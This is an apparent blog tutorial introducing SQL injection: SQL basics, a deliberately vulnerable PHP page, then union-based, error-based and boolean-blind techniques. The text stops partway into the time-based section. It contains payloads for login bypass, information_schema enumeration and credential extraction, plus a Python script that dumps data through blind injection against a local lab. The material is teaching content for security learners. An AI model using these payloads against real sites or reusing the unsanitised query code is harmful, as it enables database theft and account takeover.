---
id: "introduccion-a-inyeccion-sql"
title: "Introduction to SQL Injection"
author: "juan-antonio-gonzalez-mena"
publishedDate: 2022-02-14
updatedDate: 2022-02-14
image: "https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-0.webp"
description: "Complete guide on SQL Injection: SQL fundamentals, types of injections (Union-based, Error-based, Boolean-based, Time-based), exploitation techniques, and practical examples with code."
categories:
  - "web"
draft: false
featured: false
lang: "en"
---

SQL injections (SQLi) are a very common attack on web applications, consisting of injecting SQL commands into legitimate SQL requests that a web server makes to the database.

An attack of this type can result in things like:

- Obtaining all information from the databases
- Updating information in the databases
- Deleting information from the databases
- Reading server files
- Writing server files
- Executing commands

And yes, all from SQL code injection.

Table of Contents:

- [Fundamentals](#fundamentals)
- [SQL in Web Applications](#sql-in-web-applications)
- [SQL Injection Concept](#sql-injection-concept)
- [In-band SQL Injection](#in-band-sql-injection)
    - [Union-based](#union-based)
    - [Error-based](#error-based)
- [Blind SQL Injection](#blind-sql-injection)
    - [Boolean-based](#boolean-based)
    - [Time-based](#time-based)
- [Out-of-Band](#out-of-band)
- [Conclusion](#conclusion)
- [References](#references)

## Fundamentals

Before seeing the different SQL injection techniques, we must understand the most basic thing, SQL itself.

First of all, SQL (Structured Query Language) is a language for database management. SQL allows defining, extracting, and manipulating data from a database.

SQL statements are usually divided into 5 types:

- DQL (Data Query Language) --> Contains the SELECT instruction.
- DML (Data Manipulation Language) --> Contains instructions like INSERT, UPDATE, or DELETE.
- DDL (Data Definition Language) --> Contains instructions like CREATE, ALTER, DROP, or TRUNCATE.
- DCL (Data Control Language) --> Contains instructions like GRANT or REVOKE.
- TCL (Transaction Control Language) --> Contains instructions like BEGIN, TRAN, COMMIT, or ROLLBACK.

All types of statements aren't really very relevant to know by heart. Simply, it's good to know that these differentiations exist between the different SQL instructions. Mostly, the instructions that may interest us most for SQL injections are those belonging to the DQL, DML, and DCL types, but we should never discard any because it might be useful depending on the situation we find ourselves in.

At this point, we already know that SQL is a language that allows us to build statements, whether to manipulate, define, or extract data from a database. Now then, how are databases structured?

We can distinguish two types of databases, relational and non-relational, also known as SQL and NoSQL. Relational databases (SQL) are based on tables, while non-relational databases (NoSQL) can be based on: documents (key-value structure), graphs, key-value, or columns.

From here, it's enough if you remember that these two types of databases exist, since it's not the objective of this post to go into details about, at least, non-relational databases (NoSQL).

Now then, what we are going to see in more depth how they are structured are relational databases, since they are the databases where SQL Injection occurs.

Within what are the two models we've seen, SQL and NoSQL, those responsible for taking these two concepts into practice are called Database Management Systems (DBMS). Specifically for relational databases, those responsible for putting it into practice are the Relational Database Management Systems (RDBMS).

The most famous RDBMS are:

- MySQL
- MariaDB
- MS SQL (Microsoft SQL)
- PostgreSQL
- Oracle

But they are not the only ones.

Each of these database managers follows the relational database model, however, each one has its unique characteristics that make them different from the others.

All of this that we have just seen can be reflected in the following diagram:

![Relational database structure model](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-1.avif)

With this diagram, we can see much more clearly the structure of a database and its position in a relational database management system.

Knowing this, let's see different SQL statements to familiarize ourselves with the language and the procedure. To do this, we're going to follow the example from the image above, everything will be done as if we were inside the "webserver" database.

Basic statement:

- SELECT \* FROM users

This statement is the most basic and we would be saying the following: "Get all the data belonging to the users table".

> Considering that we don't have to specify the database because we are already inside it (webserver)

This statement would obtain and give the following result:

![Result of SELECT * FROM users showing complete table](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-2.avif)

Another example of a statement would be:

- SELECT username, password FROM users WHERE id=1

Here we've already made a few changes. For example, we're no longer saying "Get all the data belonging to the users table" but we're saying: "From the users table, get only the results from the username and password columns".

However, as we see, then we're placing another condition (WHERE id=1), here we're telling it to only return results that meet the condition that the value of the id column equals 1.

So the complete query would be: "From the users table, return only the results from the username and password columns. Additionally, I only want you to return results that meet the condition that the value of the id column equals 1".

The result would be:

![Result of SELECT with WHERE id=1 showing a single user](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-3.avif)

If the query instead of being:

- SELECT username, password FROM users WHERE id='1'

Were:

- SELECT username, password FROM users WHERE username="sikumy"

It would give the same result.

We could summarize that the structure of a basic statement would be:

- SELECT <columns> FROM <table> WHERE <condition>

To this structure, we can add other instructions or change something to slightly change their behavior. Let's see some of them:

- SELECT DISTINCT <columns> FROM <table>

In this case, the DISTINCT instruction simply eliminates duplicate results, so that they are only shown once.

- SELECT "hello", "how", "are", "you", "???" FROM <table>

The SELECT instruction also allows defining constant values. In such a way that constant values are shown regardless of the table's content. For example, we have the following table:

![Example table with three rows of data](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-4.avif)

If we make a request like the one written above, with constant values, the result will be:

![Result of SELECT with constant values showing personalized text](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-5.avif)

If we look, it doesn't even matter if we put more columns than there actually are in the table. Right now perhaps this functionality makes little sense to you, but we'll be able to see a useful use for SQL Injection.

Another useful instruction that we'll see better use of later is LIMIT:

- SELECT <columns> FROM <table> \[we could place the WHERE here in the middle\] LIMIT <number>, <quantity>

This instruction basically allows you to limit the results of a query. For example, going back and bringing this table again:

![Example table with three rows of data](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-6.avif)

Knowing that this statement returns all the table's content, in this case, 3 rows. We can limit the results with LIMIT. Example 1:

![Example of LIMIT 1,2 showing second and third row](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-7.avif)

> CAREFUL: Keep in mind that LIMIT counts from 0, that is, 0 is the first result, 1 the second, etc.

Here we're saying: "From the result, go to position 1 (which is the second row of what it returns because it counts from 0) and limit from this position to two results".

That's exactly why the result we get is from the second row, and since we've limited the results to 2, it shows us rows 2 and 3. Another example:

![Example of LIMIT 0,2 showing first and second row](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-8.avif)

Here we're saying: "Hey, start from position 0 (first row of what it returns) and show me from that position a quantity of 2 results". That's exactly why it shows us rows 1 and 2, but not 3.

I hope this last explanation was understood 🥺. In any case, we'll see it again later.

Finally, SQL also supports comments, these can be declared in two different ways:

- #
- `--` (two dashes followed by a space, it's usually always put as `-- -` so that the space is noticeable)

With this, anything we place after any of these symbols will be ignored, since it will be interpreted as a comment. Example:

![Example of comments in SQL using # and --](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-9.avif)

Despite putting nonsense and invalid things, since they're placed after the comment symbols, nothing happens. This will be useful for SQL Injection.

Having seen all this introduction to SQL, let's see its implementation in Web Applications.

## SQL in Web Applications

We already know the fundamentals of SQL, now let's see how a database connects to a web application. The code we're going to use in this post is the following:

```php
<?php

// Data
$dbhostname = 'localhost';
$dbuser = 'root';
$dbpassword = 'sikumy123$!';
$dbname = 'webserver';

//Create connection
$connection = mysqli_connect($dbhostname, $dbuser, $dbpassword, $dbname);

//Check if the connection was made correctly
if (!$connection) {
    echo mysqli_error($connection);
    die();
}

// Book id parameter
$input= $_GET['id'];

// Query to MySQL
$query = "SELECT title, author, year_publication FROM books WHERE id=$input";

// Execute query
$results = mysqli_query($connection, $query);

// Check if the query was made correctly
if (!$results) {
    echo mysqli_error($connection);
    die();
}

echo "<h1>Your trusted library API</h1>";

// Get and display query results. Results are stored in an array which we iterate through
while ($rows = mysqli_fetch_assoc($results)) {

    echo '<b>Title: </b>' . $rows['title'];
    echo "<br />";
    echo '<b>Author: </b>' . $rows['author'];
    echo "<br />";
    echo '<b>Publication Year: </b>' . $rows['year_publication'];
    echo "<br />";

}

?>
```

Let's break this down in parts to explain it.

The first thing is to establish the configuration, in other words, the data necessary for the web application to successfully connect to the database. In this case, it's defined at the beginning of the file:

![PHP code with database configuration variables](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-10.avif)

After this definition, we must connect to the database using this data:

![PHP code establishing connection to database with mysqli_connect](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-11.avif)

If the connection is successful, the PHP code will continue with the rest of the code, if not, it will stop.

Once the connection with the database manager and the database has been established, it's time to declare the query that will be made:

![PHP code defining SQL query with GET parameter](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-12.avif)

In this case, there will be a dynamic value that we'll set through a GET request on the web server. This value will filter the query by the id field.

Up to here we've already established the main things to connect a web application with a database:

- We've defined the necessary data for the connection
- We've successfully made the connection
- We've made the query

Finally, we just need to display the query results, in this case we'll do it the following way:

![PHP code showing results with while loop](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-13.avif)

We perform a loop which will iterate through the $results variable. This variable is an array that contains the different results returned by the query made earlier.

So inside the loop, we simply display the results, filtering by column to show each result in its corresponding place.

The visual result of all this code is the following:

![API showing book information with title, author, and year](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-14.avif)

> Careful, here I already have several things defined, such as the database, the corresponding table, and the columns with their data. In case you want to set it up locally with the code I left above, you have two options.
> 
> 1\. Create everything with the same database names, table, and columns (the data you can fill with whatever you want).
> 
> 2\. Adapt the code to something you already have or something different.

This way we've seen is one possible way to connect a web application to a database. However, it's not the only one (and probably perhaps not the best either, forgive me developers 😢).

## SQL Injection Concept

We've already seen enough fundamentals to be able to understand SQL Injection. Now let's see the base idea of all attacks of this type.

Following the lab we've been setting up throughout this post, we've reached the following:

![API showing book information with title, author, and year](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-15.avif)

In this case, we know that the SQL statement that's executed in the background in the id parameter is the following:

- SELECT title, author, year\_publication FROM books WHERE id=<value we control>

In the image above, the statement executed in the background would be:

- SELECT title, author, year\_publication FROM books WHERE id=1

In this case, no sanitization is being done, so what happens if in addition to 1 or whatever number, we place an SQL statement.

That is, for example, the following statement:

- SELECT title, author, year\_publication FROM books WHERE id=1 and 2=1-- -

Here we're adding a condition. By itself, originally if an identifier that exists is placed, such as 1, it will return the results related to this id (as we see in the image). However, now we're adding that in addition to this, the condition 2=1 must be met, which will always result in FALSE.

Since these two conditions (that the id exists, and the 2=1) are joined by an AND operator, for the query to return a result, both conditions must be true. We already know that the second will always give FALSE, so the server should not return any results if we launch that query.

> CAREFUL, it should not return any results assuming there's an SQL Injection. Well, let's see, in this case, we know there is one. But, in any other case, we could confirm it this way.

![API with no results when using false condition AND 2=1](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-16.avif)

It doesn't return anything, so what we're saying above is happening exactly. In the same way, if we change the query to:

- SELECT title, author, year\_publication FROM books WHERE id=1 and 1=1-- -

Now we are placing a TRUE condition. We're making the result of both conditions also be true, so:

![API showing results when using true condition AND 1=1](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-17.avif)

In this case, now the server does return results. In a real example, this could serve us to analyze the existence of SQL Injection by analyzing the server's responses based on the conditions we provide.

The most typical way to detect an SQL Injection is by putting a quote and checking if the server returns any type of error in the response:

![SQL error shown when injecting single quote](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-18.avif)

However, the case may occur where the server doesn't return errors, so the option of analyzing the server's response based on conditionals is a good option.

> NOTE: As we see, in addition to the condition itself that we've added (1=1 or 2=1), after this we're adding the comment instruction in SQL.
> 
> In this case, it wouldn't really be necessary to place it, since we know that in the SQL statement that's executed, after the ID value, there's no more SQL statement. But in a real case, we're not going to know what statement will be executing in the background, so it's best to get used to always placing the comment symbol when dealing with an SQL Injection to make everything else ignored and our input be the end of the statement.

> Going back to conditions, here something curious to mention is that the AND operator is always validated before the OR operator.
> 
> What does this mean?

Well, for example, let's imagine the following statement:

- SELECT \* FROM logins WHERE username="<INPUT>" AND password="<INPUT>"

This statement belongs to a login, with this, what happens if we introduce X data in the username field and in password in such a way that the values are the following:

![SQL injection in username field with OR 1=1](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-19.avif)

The statement that the server will execute to validate if the data is true will be:

- SELECT \* FROM logins WHERE username="admin" OR "1"="1" AND password="no\_idea\_what\_it\_is"

Here, just like in the previous example, we're introducing a condition. However, let's analyze its behavior keeping in mind what was mentioned above about AND and OR and assuming that the admin user DOES exist:

![Diagram of SQL conditional logic with AND and OR](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-20.avif)

This would basically be the behavior of a statement when operators like AND and OR are mixed. In this case, for example, we would manage to log in as the admin user without knowing their password, since the resulting value of all conditions is TRUE and the admin user exists.

Now then, what happens if instead of injecting the condition in the username field, we do it in the password field?

![SQL injection in password field with OR 1=1](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-21.avif)

The behavior would be the following:

![SQL logic diagram injecting in password field](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-22.avif)

In this case, whatever the username or password is, even if both are incorrect, the statement will return TRUE. How would the application behave in this case? Since it's TRUE, but the query will return all results from the table, who would the session be initiated with?

Well normally, the logic that the application would follow in this case would be to log in with the user from the first result, in other words, with the user from the first row of the entire table, which in many cases is usually the administrator.

In these two ways we've seen, we would manage to take advantage of the SQL Injection to, in both cases, manage to log in without knowing credentials by taking advantage of the logic of conditions and their manipulation.

> With all this we just saw you can now understand the typical SQL Injection t-shirt:

Finally, we previously mentioned that the use of a comment will make everything after it be treated as such. So, suppose we have the following statement we saw above:

- SELECT \* FROM logins WHERE username="admin" OR "1"="1" AND password="no\_idea\_what\_it\_is"

If we add the following:

- SELECT \* FROM logins WHERE username="admin" OR "1"="1"#" AND password="no\_idea\_what\_it\_is"

> We could also have used: `-- -`

It will make all this part ignored:

- SELECT \* FROM logins WHERE username="admin" OR "1"="1"#" AND password="no\_idea\_what\_it\_is"

And, therefore, the statement that will be executed will be:

- SELECT \* FROM logins WHERE username="admin" OR "1"="1"#

This would be a demonstration of why we should always place comment instructions in our injections.

![STOP meme before continuing](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-23.avif)

STOPPPP. Before continuing, let's make a mini recap of what we have so far:

- We've seen the introduction to SQL and how it's related to database managers and the types of databases that exist.
- At the same time, we've seen the structure of relational databases. So that we can understand how everything is set up and in what form information is stored.
- To familiarize ourselves a bit with SQL, we've seen some instructions and statements of the language.
- After all this, we've seen an example of connection between web application and database.
- With all this base, we've introduced ourselves to SQL Injection seeing some basic concepts and situations.

Having seen all this, it's now time to introduce ourselves to slightly more advanced examples and the types of SQL Injection that exist. The following diagram summarizes the types of techniques and SQLi that exist:

![Diagram of SQL Injection types: In-band, Inferential, and Out-of-band](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-24.avif)

Let's see them all one by one.

## In-band SQL Injection

This type of SQLi is the most basic and simple of all. Since, when we refer to "In-band" it means that we are able to see the database's response in the server's response. Within this type, we find two subtypes, injections based on Error and Union.

##### Union-based

Within SQL we have the UNION instruction. This instruction allows joining the results of different SELECT instructions. An example of a statement with this instruction would be the following:

- SELECT column1, column2 FROM table1 UNION SELECT column1,column2 FROM table2;

At a visual level, this instruction would join the results in the following way:

![Visual diagram of how UNION works in SQL](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-25.avif)

Here are some details to keep in mind with this instruction:

- When we perform a union between two SELECTs, both must have the same number of columns (not in the table itself, but columns selected in the query).
- At the same time, each column must match in data type, that is, in the case above, the data type of column 1 of table 1 must be the same as that of column 1 of table 2. So that at the moment of stacking them as we see above, there are no errors.
    - Careful, of the selected columns, not the original columns, what do I mean by this? If the query had been for example:
        - SELECT column1, column2 FROM table1 UNION SELECT column3,column4 FROM table2;
    - The data type of column1 must be the same as that of column3. In the same way, that of column2 must be the same as that of column4 and so on...
- By itself, the UNION instruction eliminates duplicates, so if we don't want this to happen, simply instead of using UNION, we use UNION ALL.

Knowing this instruction, let's see how we can take advantage of it to obtain information from the database.

Taking into account the requirements to be able to use the UNION instruction, our first task is to check how many columns the statement being executed in the background has. This can be checked in two ways, with the UNION instruction itself or using ORDER BY. Let's do it both ways:

- ORDER BY

The ORDER BY instruction serves to order the result of a statement by the column we want. The column is specified by the number that corresponds to it, the leftmost column is 1, the next one 2, and so on...

So, the idea is to place in the id field the following:

- 1 ORDER BY <number we'll iterate through>#

> Again, the comment instruction although in this case it's not necessary. I'm placing it to get us used to always putting it.

![Successful result with ORDER BY 1](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-26.avif)

![Successful result with ORDER BY 2](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-27.avif)

![Successful result with ORDER BY 3](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-28.avif)

We see that as long as the column we're telling it to order by exists, the server won't give any problem in the response. However, when we reach the point where the column we're telling it to order by doesn't exist, the following will happen:

![Error with ORDER BY 4 indicating unknown column](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-29.avif)

In this way, we confirm that the SQL statement executing in the background has 3 columns. Knowing this, we would proceed to use UNION (later we'll see what to do when we reach this point).

> In this example, the server's response is super evident. However, in other cases, the error may be less noticeable. It's our task to analyze the server's behavior.

- UNION

Now, let's do the same but using the UNION instruction itself. The idea is the following:

- UNION SELECT <iterate until reaching the correct number>#

In this case, to enumerate the number of columns we're going to take advantage of the UNION instruction's own requirement:

> Both SELECTs that are joined must have exactly the same number of columns

Keeping this in mind, if I do for example the following:

![Error when using UNION SELECT with a single column](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-30.avif)

The error corresponding to what we've explained will appear.

> Note: I've placed the word null because as it literally means "null" it will serve us regardless of the data type, since null is admitted by all. This way we don't have to worry about whether what we're putting is an integer (number), a string, or whatever.
> 
> Also, to clarify, placing null is not the same as "null", since in the second we are explicitly saying it's a string

Knowing this, it's now a matter of placing columns in our SELECT until the number of columns of both SELECTs match:

![Error when using UNION SELECT with two columns](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-31.avif)

![Successful UNION SELECT with three columns showing null](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-32.avif)

Careful, here we see how now the columns do match by the server's response. Additionally, we see how presumably what we've placed in our SELECT is shown to us. We can confirm this by doing this:

![UNION SELECT showing custom text values](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-33.avif)

> It doesn't give us a failure, because the three columns of the first SELECT match in having a data type that admits strings, otherwise it wouldn't work. We would have to keep trying to put numbers or whatever until the server returns it to us in the response.

And this is how we would enumerate the number of columns of the SQL statement.

Now, going back to the main topic, how can we take advantage of the UNION instruction to obtain all the information we want from the database?

Well, it's simple. For example, within the same database where the book information is, I've created a table called users, which contains users and passwords:

![Users table with user and password columns](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-34.avif)

Knowing this, we can make a query like the following:

- 1 UNION SELECT user, password, null FROM users#

![UNION SELECT extracting users and passwords from users table](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-35.avif)

In this way, we manage to dump all the data.

> The way in which the data will be displayed or the amount of data shown will depend on how everything is set up. If for example, here they only showed us one result, we could move through the different results using the LIMIT instruction.

Now then, here you can say: "Sure, but you can do this because you know beforehand that there's a table called users with those columns and such".

And it's true. How would we proceed in a case where we know absolutely nothing about the database?

Well, this is going to depend on the database manager being used. The thing is that all managers have certain default databases that store information from the rest of the databases.

![Information_schema database in MariaDB](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-36.avif)

To see this more clearly, let's see how it would be carried out in MariaDB (it would be the same way in MySQL, since they are almost identical managers).

We're going to start from knowing the number of columns and being able to use the UNION instruction without problems. With this done, the first thing we're going to enumerate are the databases. To do this, we're going to use the following statement in the id parameter:

- 1 UNION SELECT null, schema\_name, null FROM information\_schema.schemata#

![Database enumeration using information_schema.schemata](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-37.avif)

As we see, all the manager's databases are listed. This is because the schema\_name column in the schemata table of the information\_schema database stores this information.

In case we had the limitation that only one result is shown to us, well we do what's already been said, iterate using LIMIT:

![Using LIMIT to enumerate databases one by one](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-38.avif)

We already know the existing databases. Let's say that when I see it, I discard by default:

- information\_schema
- performance\_schema
- mysql

Since they are default databases of the manager.

So we focus on the database named "webserver". With this information, we proceed with the following statement:

- 1 UNION SELECT null, table\_name, table\_schema FROM information\_schema.tables WHERE table\_schema="webserver"#

![Enumeration of tables from webserver database](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-39.avif)

As we see, all tables belonging to the webserver database are listed (in the same way, it lists which database the tables belong to). In this case, seeing this, the table that most catches our attention is users, so now we must enumerate the columns of this table:

- 1 UNION SELECT column\_name, table\_name, table\_schema FROM information\_schema.columns WHERE table\_name="users" and table\_schema="webserver"#

![Enumeration of columns from users table](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-40.avif)

In this way, we just finished enumerating:

- All databases
- The tables of the webserver database
- The columns of the users table of the webserver database

Having this information already, we can do the same as we did at the beginning:

![Final extraction of users and passwords using UNION](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-41.avif)

A tip to mention here is that perhaps, the case may occur where only the result of one column is shown in the server's response. And perhaps to obtain information like user:password it can be a bit of a pain. So in this type of situations we can make use of the CONCAT() function:

![Using CONCAT to combine user and password in a single column](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-42.avif)

> 0x3a is the colon (:) in hexadecimal. We could also have put it as ":"

This function allows us to concatenate various words and characters, including columns. This way we're obtaining two columns in one field.

This procedure would be what would have to be done in managers like MariaDB or MySQL. To see how it would be in other managers the best is to look for cheatsheets of each one:

- _[SQL Injection cheatsheet for MS-SQL on pentestmonkey](https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)_
- _[SQL Injection cheatsheet for Oracle on pentestmonkey](https://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet)_

##### Error-based

Having finished with Union-based, it's time to see Error-based. This type of SQL Injection consists of purposely causing an error on the server, in such a way that in this response, we get results from the database.

Let's put ourselves in the example that the server doesn't return the results of requests to the database, this could be a Blind SQL as we'll see later, but for our convenience, it would be best to be able to see the results in this server response. So, what we can try is to cause an error on the server so that if the case occurs, the server does show in its response this error, and within this error, the result of an SQL statement that we tell it.

It will be clearer now when we see it.

What needs to be clear is that there are many ways to generate errors, so what we'll see is just one way of the many there are. Additionally, it will change depending on the manager being used.

In MySQL/MariaDB we can use the following statement:

- AND ExtractValue('',Concat('=',(<SQL STATEMENT>)))

![Error-based SQL Injection extracting user via ExtractValue](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-43.avif)

In this case, through an error, we're managing to show the first username from the users table.

> Careful, here it no longer happens that the SQL statement we execute is in conjunction with the server's SQL statement, in the sense that we have to make use of UNION. Since this statement (SELECT user FROM users LIMIT 0,1) from the image, goes completely separate.
> 
> Because the statement that does go in conjunction with the server's, is the one that causes the error itself.

Here we're going to take the opportunity to introduce another concept, and that's functions. We've already seen some like CONCAT(). But there are other functions which can return information about the SQL manager, the user executing the manager, etc. For example:

- @@version --> In MySQL and MariaDB, it returns the database manager version.

![Extraction of MySQL version using @@version](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-44.avif)

Another function can be user():

![Extraction of current user using user() function](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-45.avif)

These types of functions we can also use in other SQL injections, since they're specific to the database manager.

In any case, all these functions or ways to cause errors on the server, as we've said, the way it's done or is, will depend a lot on the database manager, so it's best to look at a cheatsheet of the manager we're dealing with (although it is true that many functions are the same and coincide in several managers).

## Blind SQL Injection

We've already seen the cases of SQL injections where we are able to see the results in the web response from the server. Now then, there will be occasions where the server returns absolutely nothing, and still, it is vulnerable to SQL Injection, these are called Blind (also known as Inferential).

In this situation, we can proceed in two different ways, in other words, there are two types of Blind SQL:

- Boolean-Based
- Time-Based

Let's see both, but, first of all, let's make the following change in our web's code:

![Original PHP code before commenting for Blind SQL](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-46.avif)

We're going to comment it all out so that the web doesn't show any response, additionally, we'll add a phrase that indicates when the request is correct and when it's not:

![Modified PHP code without showing results](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-47.avif)

![Message indicating successful request without showing data](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-48.avif)

##### Boolean-Based

This technique is the same one we saw at the beginning of the post, by which, depending on the server's response, we could detect if there was an SQL Injection or not:

![Boolean-based with false condition AND 2=1](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-49.avif)

![Boolean-based with true condition AND 1=1](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-50.avif)

However, we haven't seen before what this technique is capable of. It may seem silly, but the fact that the server's response changes depending on a boolean condition (True or False) can determine that we can get all the information we want from the database.

This is because we can make use of the following function:

- SUBSTR(<SQL STATEMENT or FUNCTION>, <Offset>, <quantity (we leave it at 1)>)

Basically, with this function we can execute either an SQL statement or a function and limit the result to 1 character, having the possibility of choosing the position of the character from the result (offset).

Knowing this, assuming that for example, we want to obtain the name of the database being used, we can create a condition like the following:

- 1 AND SUBSTR(database(), 1, 1)='a'#

We already know that the database is webserver, so let's see the server's behavior with this condition:

![SUBSTR test with incorrect letter 'a' with no result](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-51.avif)

Since the database is webserver, the result of the function SUBSTR(database(), 1, 1) will be w.

In an iterated way, the result of the function SUBSTR(database(), 2, 1) will be e.

- SUBSTR(database(), 3, 1) will be b.

- SUBSTR(database(), 4, 1) will be s.

- etc.

Understanding how it works, for example, let's change the 'a' to 'w' (which we already know is the first letter of the database name) to see the server's response:

![SUBSTR test with correct letter 'w' showing success](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-52.avif)

With this, we realize that when the letters are equal, the server will return in the response: "The request was made successfully". So, with this data, we can make a script that iterates through the entire alphabet and obtains the server's responses and analyzes them, checking that:

- In the case that the server returns "The request was made successfully". It will mean that the letter we've iterated through is correct.
- If it doesn't return that phrase, well, next letter.

In this case I've put together the following script in python3:

```python
#!/usr/bin/python3

import requests
import sys

uppercase = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
lowercase = uppercase.lower()
numbers = '1234567890'
symbols = '|@#~!"·$%&/()=:.-_,; <>[]{}?\r\n'

dictionary = lowercase + uppercase + numbers + symbols

def booleanSQL():

        global info
        info = ''

        for i in range(1,100):

                stop = False

                for j in dictionary:

                        response = requests.get("http://localhost/books.php?id=1 AND SUBSTR(database(), %d, 1)='%s'#" % (i, j))

                        if 'The request was made' in response.text:

                                print("Letter number %d is %s" % (i, j))

                                info += j

                                stop = False

                                break

                        stop = True

                if stop:
                        break

if __name__ == '__main__':

        booleanSQL()

        print("\nThe database is called %s" % info)
```

Running this script, magic happens:

![Python script enumerating database with Boolean-based](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-53.avif)

We manage to enumerate information based on how the server's response changes depending on the boolean condition.

We can now enumerate anything, we would only have to change the query in the request:

![Script modification to extract users](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-54.avif)

![Script result extracting first user](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-55.avif)

> For example, in this case, the query SELECT user FROM users returns more than one result, so to be able to enumerate, we must limit the result to 1 using LIMIT. In this case we could make another for loop that iterates through LIMIT so it gets the results from each row.

Another example:

![Script modified to extract version with @@version](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-56.avif)

![Script result showing MariaDB version](https://cdn.deephacking.tech/i/posts/introduccion-a-inyeccion-sql/introduccion-a-inyeccion-sql-57.avif)

And so, with the techniques we've seen throughout this post, we could enumerate everything.

##### Time-Based

Time-based Blind SQL injections, in concept are the same as those based on booleans. Only in this case, the server doesn't return any change in the response regardless of the condition.

Let's comment the following part of the code so it's like this:

